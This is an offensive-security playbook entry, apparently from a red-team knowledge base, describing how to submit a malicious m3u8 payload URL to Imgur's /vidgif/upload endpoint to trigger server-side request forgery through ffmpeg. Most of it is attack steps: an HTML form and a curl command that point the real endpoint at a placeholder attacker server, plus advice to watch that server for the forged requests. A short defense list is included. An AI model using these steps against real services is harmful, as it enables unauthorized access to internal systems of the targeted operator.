---
id: proc-imgur-submit-001
tags:
  - ssrf
  - upload
  - ffmpeg
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:37.538Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Payload-to-Imgur-VidGif-Upload

## Summary

This procedure submits the malicious m3u8 URL to Imgur's /vidgif/upload endpoint via POST, triggering ffmpeg to download and process the payload, initiating SSRF.

## Description

Imgur's service performs an HTTP HEAD to check content-type, then GET to download, passing to ffmpeg. The fake video/avi response contains m3u8, which ffmpeg parses to make GET requests to embedded URLs. This step requires preparing an HTML form or using curl for the POST with 'source', 'url', 'start', and 'stop' parameters.

## Requirements

1. Hosted m3u8 payload URL
2. Access to POST to https://imgur.com/vidgif/upload
3. Timestamps for video segment (e.g., start:0, stop:10)

## Defense

Defensive measures and detection strategies:

- Rate-limit uploads and monitor for anomalous ffmpeg behavior
- Sandbox media processing to block outbound connections
- Log and alert on unexpected protocols in media files

## Objectives

1. Trigger Imgur's download and processing
2. Initiate SSRF via ffmpeg parsing
3. Confirm via incoming requests

## Instructions

### Step 1: Create Submission Form

**Context**: Build an HTML form to POST the payload.

No command; create HTML:

```html
<form action="https://imgur.com/vidgif/upload" method="post">
<input type="hidden" name="source" value="url">
<input type="hidden" name="url" value="http://yourserver/m3u8-ssrf.php">
<input type="hidden" name="start" value="0">
<input type="hidden" name="stop" value="10">
<input type="submit" value="Submit">
</form>
```

> Load in browser and submit. Alternatively, use curl for automation.

### Step 2: Submit via Curl

**Context**: Automate the POST request.

```bash
curl -X POST https://imgur.com/vidgif/upload \
  -d "source=url" \
  -d "url=http://yourserver/m3u8-ssrf.php" \
  -d "start=0" \
  -d "stop=10"
```

> Expected output: Imgur response (may be JSON or redirect). Monitor attacker server for incoming SSRF request.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- upload
- post-request
